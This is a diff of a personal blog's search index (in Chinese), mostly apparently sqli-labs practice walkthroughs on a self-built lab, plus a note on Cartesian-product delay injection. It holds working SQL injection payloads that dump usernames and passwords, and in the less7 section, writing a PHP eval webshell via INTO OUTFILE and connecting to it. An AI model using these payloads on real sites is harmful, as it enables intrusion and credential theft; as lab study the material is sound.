@@ -19,6 +19,111 @@
 ]]></content>
   </entry>
   <entry>
+    <title>less1-7</title>
+    <url>/2024/11/06/less1-7/</url>
+    <content><![CDATA[<h1 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h1><p><strong>首先判断是否存在sql注入漏洞：</strong></p>
+<p>利用无论字符型还是整型都会因为单引号个数不匹配而报错，输入?id&#x3D;1（? 是查询字符串的开始标志，它告诉服务器URL的这一部分包含的是查询参数。）正常返回，输入?id&#x3D;1’,报错，说明存在注入.<img src="/../images/1730902369074.jpg" alt="1730902369074" loading="lazy"></p>
+<p><strong>判断sql注入漏洞的类型：</strong></p>
+<p>通常sql注入漏洞的类型有两种:数字型和字符型。</p>
+<p><em>判断</em>：当输入的参 x 为整型时，Sql 语句大致如下：select * from &lt;表</p>
+<p>名&gt; where id &#x3D; x这种类型可以使用的and 1&#x3D;1 和 and 1&#x3D;2 可以通过加，</p>
+<p>减，乘，除等运算来判断输入参数周围有没有引号来包围来判断：Url 地</p>
+<p>址中输入x and 1&#x3D;1 页面依旧运行正常，继续进行下一步。Url 地址中继</p>
+<p>续输入x and 1&#x3D;2页面运行正常，则说明输入参数有引号包围，为字符型。</p>
+<p><img src="/images/1730902565152.jpg" loading="lazy"></p>
+<p><strong>判断表的字段数：</strong></p>
+<p>使用order by 函数来判断，order by函数是用来让返回</p>
+<p>的结果集以某一列来排序，输入 id&#x3D;1’ order by 3–+（–+可以使后面的</p>
+<p>代码变成注释从而无法执行）正常，说明存在第三列，再输入id&#x3D;1’ order</p>
+<p> by 4–+报错，说明只有三个字段。<img src="/images/1730902802300.jpg" loading="lazy"></p>
+<p><strong>使用联合查询来爆显示位：</strong></p>
+<p>输入?id&#x3D;-1’ union select 1,2,3 – +（）可</p>
+<p>知显示位，这是将一个固定的结果集（在这个例子中是包含三列，每列的</p>
+<p>值分别是 1、2、3 的单行）与原始查询的结果集合并，id&#x3D;-1是为了使前</p>
+<p>面的查询为空，不然只会显示前面查询的结果。<img src="/images/1730902876253.jpg" loading="lazy"></p>
+<p><strong>查看当前数据库：</strong></p>
+<p>利用自带函数datebase()查询数据库名称。输入?id&#x3D;-2’ union select 1,2,database() –+。<img src="/images/1730903040670.jpg" loading="lazy"></p>
+<p><strong>查表名：</strong></p>
+<p>利用GROUP_CONCAT函数将一个字段的多行连接成一个字符串并显示，即?id&#x3D;-1’ union select 1,2,GROUP_CONCAT(table_name) from </p>
+<p>information_schema.<code>TABLES</code> where table_schema &#x3D;’security’;–+</p>
+<p>(information_schema是MySQL中默认建立的数据库里面包含scheata，</p>
+<p>tables，columns。有我们想要的表名)<img src="/images/1730903363614.jpg" loading="lazy"></p>
+<p><strong>查列名：</strong></p>
+<p>同样利用GROUP_CONCAT。即GROUP_CONCAT(column_name) from information_schema.columns where table_name &#x3D;’users’ and table_schema&#x3D;’security’<img src="/images/1730941402519.jpg" loading="lazy"></p>
+<p><strong>查询账户以及密码：</strong></p>
+<p>同样使用GROUP_CONCAT函数，?id&#x3D;-1’ union select1</p>
+<p>,group_concat(username),group_concat(password) from users – +即</p>
+<p>可得到账户密码。<img src="/images/1730941548996.jpg" loading="lazy"></p>
+<p>。</p>
+<h1 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h1><p>与less1类似不过是整形注入，输入id的时候后面不用加引号啥的。</p>
+<h1 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h1><p>输入id&#x3D;1’发现报错信息和之前有点不一样，多了个括号。</p>
+<p><img src="/../images/1730944460794.jpg" alt="1730944460794" loading="lazy"></p>
+<p>我们查看源码发现是单引号和括号型的。<img src="/../images/1730944568271.jpg" alt="1730944568271" loading="lazy"></p>
+<p>我们尝试加括号，可以了。<img src="/../images/1730944652494.jpg" alt="1730944652494" loading="lazy"></p>
+<p>接下来就和less1一样。</p>
+<h1 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h1><p>是双引号加括号的注入，别的步骤与less1类似</p>
+<h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><p>先判断什么类型的注入，由前面的知识易得是单引号注入。但与之前不一样的是，这里如果正确查询是不返回信息的，只有错误才返回错误信息。![3327075-20240202223242845-678741103 (1)](..&#x2F;images&#x2F;3327075-20240202223242845-678741103 (1).png)</p>
+<p><img src="/../images/3327075-20240202223254490-408531609.png" alt="3327075-20240202223254490-408531609" loading="lazy"></p>
+<p>我们便可以想到盲注</p>
+<p><strong>方法1</strong>；<strong>布尔盲注</strong></p>
+<p>基本原理是根据返回页面的正确与否来判断我们的查询代码是否能正常执行。</p>
+<p>布尔盲注主要用到<strong>length()</strong>,<strong>ascii()</strong> ,**substr()**这三个函数，</p>
+<p><strong>length（）</strong> 返回括号中字符串的长度；<strong>ASCII（）</strong> 返回的是括号中字符或字符串的第一个字符的ASCII码；<strong>substr(str,start,len)</strong> 截取“str”字符串从第“start”位开始的“len”长度的字符。</p>
+<p>首先用<strong>length（）</strong> 确定你要查询的库名或表名或字段名的长度，再用</p>
+<p><strong>ASCII（substr(库名，start，len))&#x3D;…</strong> 来判断库名的某个字符是什么。为了提高效率，我们可以使用代码批量操作，这里不作说明。</p>
+<p> <strong>方法2</strong>；<strong>双查询注入</strong></p>
+<p>关于啥是双查询注入请看 [双查询注入](<a href="https://blog.csdn.net/weixin_43901998/article/details/105227678">Less 5-6（双注入）_less-5-CSDN博客</a>)的后半部分。</p>
+<p><em>我们摘出重要的部分：</em></p>
+<p><img src="/../images/188c1b8f4eb7bf37cd72dbb26d6a446e.png" alt="188c1b8f4eb7bf37cd72dbb26d6a446e" loading="lazy"></p>
+<p><em>上面这张图就是group by通过floor分组的过程。<br>我们知道floor产生的随机序列是固定的011011,再进行group by分组的时候，我会将这个随机序列作为虚拟表的key, 进行查询和插入两步操作。我们假设要先查询后插入，这里我把没有查询到值的查询用黑色，查询到值的查询用红色。</em></p>
+<p><em>下面来描述一下查询和插入的过程：</em></p>
+<p><em>第一次查询，再虚拟表中查询key为0的字段，发现虚拟表为空，因此进行插入操作。<br>第一次插入，再进行插入操作的时候，group by会再次调用floor()，因此插入的key是1而不是0，还会将对应的count()值填在key的后面。<br>第二次查询，查询时，group by再一次调用floor，得到的值为1，查询虚拟表中是否有key为1的字段，发现存在，因此此处的插入操作就是将coun()的值进行叠加。此时第二次查询操作和插入操作都已经完毕，然后进行第三次查询。<br>第三次查询，此时查询的key为0，发现虚拟表中没有0，因此要进行插入操作。<br>第三次插入，再进行插入前，group by要调用floor()，得到了1，因此要插入一个key为1的字段。而key为1的字段已经存在了，因此主键重复，MySQL会报错。（图上多画了一个最后红色的查询3，可以忽略掉）</em></p>
+<p>了解双查询注入后，我们便可以编辑代码测试。</p>
+<p><code>?id=1&#39; and (select (floor(rand(0)*2 )) as a,count(*) from information_schema.tables group by a)--+</code></p>
+<p>但发现<img src="/../images/1731121921050.jpg" alt="1731121921050" loading="lazy"></p>
+<p>经过查询，是因为如果在一个条件语句（如 <code>WHERE</code> 或 <code>AND</code>）中使用子查询，并且子查询返回了多个列，那么会引发 <code>Operand should contain 1 column(s)</code> 错误。因为在这种情况下，MySQL 不知道如何将多个列与外部查询的某个列进行比较。我们这里就是返回了两列结果。</p>
+<p>我们改进一下，在子查询前加上select 1，这样子and后的整个查询语句只会关系子查询是否有结果而不会在意有几列。</p>
+<p><code>?id=1&#39; and (select 1 from (select concat((floor(rand(0)*2 )),database()) as a,count(*) from information_schema.tables group by a)as t)--+</code></p>
+<p>我们便可以用concat来连接我们想要查询的数据。所以最终的公式为</p>
+<p><code>?id=1&#39; and (select 1 from (select concat((floor(rand(0)*2 )),查询语句) as a,count(*) from information_schema.tables group by a)as t)--+</code></p>
+<p><img src="/../images/1731124371854.jpg" alt="1731124371854" loading="lazy"></p>
+<p>（注意1是报错输出的一部分，无视就好了）</p>
+<p>接下来我们便可以查询我们想要数据了。</p>
+<p>例如查表名</p>
+<p><img src="/../images/1731126185859.jpg" alt="1731126185859" loading="lazy"></p>
+<p><strong>记得给查询语句加括号 : )</strong></p>
+<h1 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h1><p>和第五题差不多，只要把单引号换成双引号就行。</p>
+<h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>根据前面的知识我们可以知道本题为单引号双括号注入。</p>
+<p><img src="/../images/%E5%9B%BE%E7%89%871.jpg" alt="图片1" loading="lazy"></p>
+<p>根据提示我们需要用到 <strong>into outfile</strong> 来写入一句话木马以便我们使</p>
+<p>用工具来控制网站。</p>
+<p>使用方法为 <strong>select … into outfile “绝对路径”</strong> ，这里我们也需要</p>
+<p>使用 union select。</p>
+<p>这段代码可以将 select 的内容注入进绝对路径下的一个文件，我</p>
+<p>们这里注入到一个 7.php 的文件下，如果没有这个文件会自动创</p>
+<p>建一个同名文件，但是这条代码不会覆盖原文件，因此写入时最</p>
+<p>好一次成功，如果要再次写入则需要更换文件名。</p>
+<p>这里使用 into outfile 需要有写入权限与绝对路径，由于靶场是我</p>
+<p>们自己搭建的，很容易知道网站的绝对路径，至于写入权限我们</p>
+<p>可以在终端中查看。<img src="/../images/%E5%9B%BE%E7%89%872.jpg" alt="图片2" loading="lazy"></p>
+<p>如果 secure_file_priv 为 null，在 MySQL 版本低于 5.7.6 是默认任</p>
+<p>意写入的，我这里是更高的版本代表禁止写入，所以要在配置文</p>
+<p>件 my.ini 中加入 <strong>secure_file_priv&#x3D;”\”</strong>便有写入权限。</p>
+<p>接下来便可开始进行注入，PHP 格式的一句话木马为：</p>
+<p><strong><?php @eval($_POST['mima']);?></strong> </p>
+<p>“mima”是我们之后用工具需要的密码</p>
+<p>所以我们的注入语句为<code>?id=1’)) union select 1,2,’&lt;?php@eval($_POST[‘mima’]);?&gt;’ into outfile &quot;C:\\PHP\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\test.php&quot;--+</code></p>
+<p><img src="/../images/%E5%9B%BE%E7%89%873.jpg" alt="图片3" loading="lazy"></p>
+<p>虽然报错的，但我们打开文件夹可以看到已经有文件存在了</p>
+<p>接下来就可以使用 webshell 工具（这里以蚁剑为例）</p>
+<p><img src="/../images/%E5%9B%BE%E7%89%874.jpg" alt="图片4" loading="lazy"></p>
+<p>连接成功。我们便可以对网站进行操控。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>less18-22</title>
     <url>/2024/11/24/less18-22/</url>
     <content><![CDATA[<h1 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h1><p>如果输入正确的账号密码，则页面回显你的ip与user-agent</p>
@@ -126,6 +231,21 @@
       </tags>
   </entry>
   <entry>
+    <title>less46-49</title>
+    <url>/2025/02/19/less46-49/</url>
+    <content><![CDATA[<p><strong>Less 46 ~ 49 的网页功能是返回一个列表，因此我们不能借助回显位置进行注入。此时可以根据是否返回报错信息，选择使用报错注入还是时间盲注。</strong></p>
+<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p>改变参数 sort 的值，发现返回的列表是根据该表的第 sort 列排序进行回显。</p>
+<p>把所有类型测试完发现是数值型注入。</p>
+<p>由于此处数据返回的形式是表格，因此我们不能直接利用数据回显的位置。此处可以使用 <strong>updatexml() 函数</strong>进行报错注入，把敏感信息输出在错误信息中</p>
+<h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><p>和less46差不多，不过是单引号闭合</p>
+<h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p>数值型，但没有错误信息回显，我们可以用时间盲注。</p>
+<h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p>和less48差不多，不过是单引号闭合。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>less42-45</title>
     <url>/2025/02/19/less42-45/</url>
     <content><![CDATA[<p><strong>Less 42 ~ 45 是使用 POST 提交参数的登录界面，username 字段进行了参数过滤，但是 password 字段没有。此处可以在 password 字段使用万能密码直接夺取用户，也可以在该字段处使用堆叠注入。</strong></p>
@@ -141,19 +261,10 @@
       </tags>
   </entry>
   <entry>
-    <title>less46-49</title>
-    <url>/2025/02/19/less46-49/</url>
-    <content><![CDATA[<p><strong>Less 46 ~ 49 的网页功能是返回一个列表，因此我们不能借助回显位置进行注入。此时可以根据是否返回报错信息，选择使用报错注入还是时间盲注。</strong></p>
-<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p>改变参数 sort 的值，发现返回的列表是根据该表的第 sort 列排序进行回显。</p>
-<p>把所有类型测试完发现是数值型注入。</p>
-<p>由于此处数据返回的形式是表格，因此我们不能直接利用数据回显的位置。此处可以使用 <strong>updatexml() 函数</strong>进行报错注入，把敏感信息输出在错误信息中</p>
-<h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><p>和less46差不多，不过是单引号闭合</p>
-<h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p>数值型，但没有错误信息回显，我们可以用时间盲注。</p>
-<h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p>和less48差不多，不过是单引号闭合。</p>
+    <title>photos</title>
+    <url>/2024/08/05/photos/</url>
+    <content><![CDATA[<p>测试 测试<br><img src="/images/OIP-C.jpg" alt="OIP-C" loading="lazy"></p>
 ]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
   </entry>
   <entry>
     <title>less23-27</title>
@@ -192,108 +303,19 @@
       </tags>
   </entry>
   <entry>
-    <title>less1-7</title>
-    <url>/2024/11/06/less1-7/</url>
-    <content><![CDATA[<h1 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h1><p><strong>首先判断是否存在sql注入漏洞：</strong></p>
-<p>利用无论字符型还是整型都会因为单引号个数不匹配而报错，输入?id&#x3D;1（? 是查询字符串的开始标志，它告诉服务器URL的这一部分包含的是查询参数。）正常返回，输入?id&#x3D;1’,报错，说明存在注入.<img src="/../images/1730902369074.jpg" alt="1730902369074" loading="lazy"></p>
-<p><strong>判断sql注入漏洞的类型：</strong></p>
-<p>通常sql注入漏洞的类型有两种:数字型和字符型。</p>
-<p><em>判断</em>：当输入的参 x 为整型时，Sql 语句大致如下：select * from &lt;表</p>
-<p>名&gt; where id &#x3D; x这种类型可以使用的and 1&#x3D;1 和 and 1&#x3D;2 可以通过加，</p>
-<p>减，乘，除等运算来判断输入参数周围有没有引号来包围来判断：Url 地</p>
-<p>址中输入x and 1&#x3D;1 页面依旧运行正常，继续进行下一步。Url 地址中继</p>
-<p>续输入x and 1&#x3D;2页面运行正常，则说明输入参数有引号包围，为字符型。</p>
-<p><img src="/images/1730902565152.jpg" loading="lazy"></p>
-<p><strong>判断表的字段数：</strong></p>
-<p>使用order by 函数来判断，order by函数是用来让返回</p>
-<p>的结果集以某一列来排序，输入 id&#x3D;1’ order by 3–+（–+可以使后面的</p>
-<p>代码变成注释从而无法执行）正常，说明存在第三列，再输入id&#x3D;1’ order</p>
-<p> by 4–+报错，说明只有三个字段。<img src="/images/1730902802300.jpg" loading="lazy"></p>
-<p><strong>使用联合查询来爆显示位：</strong></p>
-<p>输入?id&#x3D;-1’ union select 1,2,3 – +（）可</p>
-<p>知显示位，这是将一个固定的结果集（在这个例子中是包含三列，每列的</p>
-<p>值分别是 1、2、3 的单行）与原始查询的结果集合并，id&#x3D;-1是为了使前</p>
-<p>面的查询为空，不然只会显示前面查询的结果。<img src="/images/1730902876253.jpg" loading="lazy"></p>
-<p><strong>查看当前数据库：</strong></p>
-<p>利用自带函数datebase()查询数据库名称。输入?id&#x3D;-2’ union select 1,2,database() –+。<img src="/images/1730903040670.jpg" loading="lazy"></p>
-<p><strong>查表名：</strong></p>
-<p>利用GROUP_CONCAT函数将一个字段的多行连接成一个字符串并显示，即?id&#x3D;-1’ union select 1,2,GROUP_CONCAT(table_name) from </p>
-<p>information_schema.<code>TABLES</code> where table_schema &#x3D;’security’;–+</p>
-<p>(information_schema是MySQL中默认建立的数据库里面包含scheata，</p>
-<p>tables，columns。有我们想要的表名)<img src="/images/1730903363614.jpg" loading="lazy"></p>
-<p><strong>查列名：</strong></p>
-<p>同样利用GROUP_CONCAT。即GROUP_CONCAT(column_name) from information_schema.columns where table_name &#x3D;’users’ and table_schema&#x3D;’security’<img src="/images/1730941402519.jpg" loading="lazy"></p>
-<p><strong>查询账户以及密码：</strong></p>
-<p>同样使用GROUP_CONCAT函数，?id&#x3D;-1’ union select1</p>
-<p>,group_concat(username),group_concat(password) from users – +即</p>
-<p>可得到账户密码。<img src="/images/1730941548996.jpg" loading="lazy"></p>
-<p>。</p>
-<h1 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h1><p>与less1类似不过是整形注入，输入id的时候后面不用加引号啥的。</p>
-<h1 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h1><p>输入id&#x3D;1’发现报错信息和之前有点不一样，多了个括号。</p>
-<p><img src="/../images/1730944460794.jpg" alt="1730944460794" loading="lazy"></p>
-<p>我们查看源码发现是单引号和括号型的。<img src="/../images/1730944568271.jpg" alt="1730944568271" loading="lazy"></p>
-<p>我们尝试加括号，可以了。<img src="/../images/1730944652494.jpg" alt="1730944652494" loading="lazy"></p>
-<p>接下来就和less1一样。</p>
-<h1 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h1><p>是双引号加括号的注入，别的步骤与less1类似</p>
-<h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><p>先判断什么类型的注入，由前面的知识易得是单引号注入。但与之前不一样的是，这里如果正确查询是不返回信息的，只有错误才返回错误信息。![3327075-20240202223242845-678741103 (1)](..&#x2F;images&#x2F;3327075-20240202223242845-678741103 (1).png)</p>
-<p><img src="/../images/3327075-20240202223254490-408531609.png" alt="3327075-20240202223254490-408531609" loading="lazy"></p>
-<p>我们便可以想到盲注</p>
-<p><strong>方法1</strong>；<strong>布尔盲注</strong></p>
-<p>基本原理是根据返回页面的正确与否来判断我们的查询代码是否能正常执行。</p>
-<p>布尔盲注主要用到<strong>length()</strong>,<strong>ascii()</strong> ,**substr()**这三个函数，</p>
-<p><strong>length（）</strong> 返回括号中字符串的长度；<strong>ASCII（）</strong> 返回的是括号中字符或字符串的第一个字符的ASCII码；<strong>substr(str,start,len)</strong> 截取“str”字符串从第“start”位开始的“len”长度的字符。</p>
-<p>首先用<strong>length（）</strong> 确定你要查询的库名或表名或字段名的长度，再用</p>
-<p><strong>ASCII（substr(库名，start，len))&#x3D;…</strong> 来判断库名的某个字符是什么。为了提高效率，我们可以使用代码批量操作，这里不作说明。</p>
-<p> <strong>方法2</strong>；<strong>双查询注入</strong></p>
-<p>关于啥是双查询注入请看 [双查询注入](<a href="https://blog.csdn.net/weixin_43901998/article/details/105227678">Less 5-6（双注入）_less-5-CSDN博客</a>)的后半部分。</p>
-<p><em>我们摘出重要的部分：</em></p>
-<p><img src="/../images/188c1b8f4eb7bf37cd72dbb26d6a446e.png" alt="188c1b8f4eb7bf37cd72dbb26d6a446e" loading="lazy"></p>
-<p><em>上面这张图就是group by通过floor分组的过程。<br>我们知道floor产生的随机序列是固定的011011,再进行group by分组的时候，我会将这个随机序列作为虚拟表的key, 进行查询和插入两步操作。我们假设要先查询后插入，这里我把没有查询到值的查询用黑色，查询到值的查询用红色。</em></p>
-<p><em>下面来描述一下查询和插入的过程：</em></p>
-<p><em>第一次查询，再虚拟表中查询key为0的字段，发现虚拟表为空，因此进行插入操作。<br>第一次插入，再进行插入操作的时候，group by会再次调用floor()，因此插入的key是1而不是0，还会将对应的count()值填在key的后面。<br>第二次查询，查询时，group by再一次调用floor，得到的值为1，查询虚拟表中是否有key为1的字段，发现存在，因此此处的插入操作就是将coun()的值进行叠加。此时第二次查询操作和插入操作都已经完毕，然后进行第三次查询。<br>第三次查询，此时查询的key为0，发现虚拟表中没有0，因此要进行插入操作。<br>第三次插入，再进行插入前，group by要调用floor()，得到了1，因此要插入一个key为1的字段。而key为1的字段已经存在了，因此主键重复，MySQL会报错。（图上多画了一个最后红色的查询3，可以忽略掉）</em></p>
-<p>了解双查询注入后，我们便可以编辑代码测试。</p>
-<p><code>?id=1&#39; and (select (floor(rand(0)*2 )) as a,count(*) from information_schema.tables group by a)--+</code></p>
-<p>但发现<img src="/../images/1731121921050.jpg" alt="1731121921050" loading="lazy"></p>
-<p>经过查询，是因为如果在一个条件语句（如 <code>WHERE</code> 或 <code>AND</code>）中使用子查询，并且子查询返回了多个列，那么会引发 <code>Operand should contain 1 column(s)</code> 错误。因为在这种情况下，MySQL 不知道如何将多个列与外部查询的某个列进行比较。我们这里就是返回了两列结果。</p>
-<p>我们改进一下，在子查询前加上select 1，这样子and后的整个查询语句只会关系子查询是否有结果而不会在意有几列。</p>
-<p><code>?id=1&#39; and (select 1 from (select concat((floor(rand(0)*2 )),database()) as a,count(*) from information_schema.tables group by a)as t)--+</code></p>
-<p>我们便可以用concat来连接我们想要查询的数据。所以最终的公式为</p>
-<p><code>?id=1&#39; and (select 1 from (select concat((floor(rand(0)*2 )),查询语句) as a,count(*) from information_schema.tables group by a)as t)--+</code></p>
-<p><img src="/../images/1731124371854.jpg" alt="1731124371854" loading="lazy"></p>
-<p>（注意1是报错输出的一部分，无视就好了）</p>
-<p>接下来我们便可以查询我们想要数据了。</p>
-<p>例如查表名</p>
-<p><img src="/../images/1731126185859.jpg" alt="1731126185859" loading="lazy"></p>
-<p><strong>记得给查询语句加括号 : )</strong></p>
-<h1 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h1><p>和第五题差不多，只要把单引号换成双引号就行。</p>
-<h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>根据前面的知识我们可以知道本题为单引号双括号注入。</p>
-<p><img src="/../images/%E5%9B%BE%E7%89%871.jpg" alt="图片1" loading="lazy"></p>
-<p>根据提示我们需要用到 <strong>into outfile</strong> 来写入一句话木马以便我们使</p>
-<p>用工具来控制网站。</p>
-<p>使用方法为 <strong>select … into outfile “绝对路径”</strong> ，这里我们也需要</p>
-<p>使用 union select。</p>
-<p>这段代码可以将 select 的内容注入进绝对路径下的一个文件，我</p>
-<p>们这里注入到一个 7.php 的文件下，如果没有这个文件会自动创</p>
-<p>建一个同名文件，但是这条代码不会覆盖原文件，因此写入时最</p>
-<p>好一次成功，如果要再次写入则需要更换文件名。</p>
-<p>这里使用 into outfile 需要有写入权限与绝对路径，由于靶场是我</p>
-<p>们自己搭建的，很容易知道网站的绝对路径，至于写入权限我们</p>
-<p>可以在终端中查看。<img src="/../images/%E5%9B%BE%E7%89%872.jpg" alt="图片2" loading="lazy"></p>
-<p>如果 secure_file_priv 为 null，在 MySQL 版本低于 5.7.6 是默认任</p>
-<p>意写入的，我这里是更高的版本代表禁止写入，所以要在配置文</p>
-<p>件 my.ini 中加入 <strong>secure_file_priv&#x3D;”\”</strong>便有写入权限。</p>
-<p>接下来便可开始进行注入，PHP 格式的一句话木马为：</p>
-<p><strong><?php @eval($_POST['mima']);?></strong> </p>
-<p>“mima”是我们之后用工具需要的密码</p>
-<p>所以我们的注入语句为<code>?id=1’)) union select 1,2,’&lt;?php@eval($_POST[‘mima’]);?&gt;’ into outfile &quot;C:\\PHP\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\test.php&quot;--+</code></p>
-<p><img src="/../images/%E5%9B%BE%E7%89%873.jpg" alt="图片3" loading="lazy"></p>
-<p>虽然报错的，但我们打开文件夹可以看到已经有文件存在了</p>
-<p>接下来就可以使用 webshell 工具（这里以蚁剑为例）</p>
-<p><img src="/../images/%E5%9B%BE%E7%89%874.jpg" alt="图片4" loading="lazy"></p>
-<p>连接成功。我们便可以对网站进行操控。</p>
+    <title>博客的创建</title>
+    <url>/2024/08/04/%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
+    <content><![CDATA[<p>搭建过程：<br>    先本地连接GitHub，再在GitHub里创建仓库，然后本地安装hexo，最后将hexo程序上传到GitHub。<br>遇到问题：<br>    1. 初始化hexo时弄错了文件夹<br>      解决：找到hexo程序所在文件夹使用git base初始化<br>    2：上传hexo时出现找不到github的邮箱和用户名的问题<br>      解决：网上寻找，在.deploy-git中的子文件.git找到config，并输入你的邮箱与用户名就可以解决<br>    &#x2F;&#x2F;之前出错的截图没了<br>    3：无法插入图片<br>      解决：b站（<a href="https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>      在source中创建images文件并将你需要的图片放入然后就可以在md文件中引用图片</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>思科</title>
+    <url>/2024/11/11/%E6%80%9D%E7%A7%91/</url>
+    <content><![CDATA[<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241111161000.jpg" alt="微信图片_20241111161000" loading="lazy"></p>
+<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241111160951.jpg" alt="微信图片_20241111160951" loading="lazy"></p>
 ]]></content>
       <tags>
-        <tag>sqlilab注入 web</tag>
+        <tag>思科模拟器</tag>
       </tags>
   </entry>
   <entry>
@@ -310,10 +332,49 @@
       </tags>
   </entry>
   <entry>
-    <title>photos</title>
-    <url>/2024/08/05/photos/</url>
-    <content><![CDATA[<p>测试 测试<br><img src="/images/OIP-C.jpg" alt="OIP-C" loading="lazy"></p>
+    <title>笛卡尔积延时注入</title>
+    <url>/2025/01/21/%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h1><p>如果一个网站存在基于时间的盲注，而恰好sleep这类核心函数被过滤的话，我们便可以使用。</p>
+<h1 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h1><p><strong>数学表示：</strong></p>
+<ul>
+<li>A &#x3D; {a1, a2, …, am}</li>
+<li>B &#x3D; {b1, b2, …, bn}</li>
+</ul>
+<p>那么笛卡尔积为</p>
+<ul>
+<li>A×B &#x3D; {(a1, b1), (a1, b2), …, (a1, bn), (a2, b1), …, (am, bn)}</li>
+</ul>
+<p><strong>数据库中：</strong></p>
+<p>若执行：</p>
+<p><code>SELECT * FROM TableA, TableB;</code></p>
+<p>TableA:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| id | name |</span><br><span class="line">|----|------|</span><br><span class="line">| 1  | Alice|</span><br><span class="line">| 2  | Bob  |</span><br></pre></td></tr></table></figure>
+
+<p>TableB:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| id | age |</span><br><span class="line">|----|-----|</span><br><span class="line">| 1  | 25  |</span><br><span class="line">| 2  | 30  |</span><br></pre></td></tr></table></figure>
+
+<p>执行 <code>SELECT * FROM TableA, TableB;</code> 后的结果将是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| TableA.id | TableA.name | TableB.id | TableB.age |</span><br><span class="line">|-----------|-------------|-----------|------------|</span><br><span class="line">| 1         | Alice       | 1         | 25         |</span><br><span class="line">| 1         | Alice       | 2         | 30         |</span><br><span class="line">| 2         | Bob         | 1         | 25         |</span><br><span class="line">| 2         | Bob         | 2         | 30         |</span><br></pre></td></tr></table></figure>
+
+<p>可以看到查询结果是两个表的笛卡尔积。</p>
+<h1 id="利用笛卡尔积进行延时注入"><a href="#利用笛卡尔积进行延时注入" class="headerlink" title="利用笛卡尔积进行延时注入"></a>利用笛卡尔积进行延时注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如果查询的表中含有大量数据，数据库进行计算时需要一段时间，进而产生延时的效果。我们便可以通过是否有延时来判断某个条件是否正确。</p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><code>select * from admin where id = 1 and (条件语句) and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</code><br>通过是否有延时效果产生来判断条件语句是否正确。</p>
+<h1 id="自动化脚本编写"><a href="#自动化脚本编写" class="headerlink" title="自动化脚本编写"></a>自动化脚本编写</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>根据是否产生延时(可通过不同个查询结果的笛卡尔积来控制)来判断条件语句是否正确</p>
+<h2 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h2><p>**time.time():**它返回自1970年1月1日00:00:00 (UTC) 至当前时间的秒数，这是一个浮点数。这个值通常被称为“Unix时间戳”。可用于计算延时时间。</p>
+<p>**requests.get（url）:**requests.get 是 requests库中的一个函数，用于执行HTTP GET请求</p>
+<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>这里以sql-lib less5（虽然这题布尔盲注也能做：)   )为例</p>
+<p><strong>爆库名长度</strong></p>
+<p><img src="/../images/1737534128492.jpg" alt="1737534128492" loading="lazy"></p>
+<p>为8</p>
+<p><strong>爆库名</strong></p>
+<p><img src="/../images/1737534277746.jpg" alt="1737534277746" loading="lazy"></p>
+<p><strong>爆表名</strong></p>
+<p><img src="/../images/1737534388694.jpg" alt="1737534388694" loading="lazy"></p>
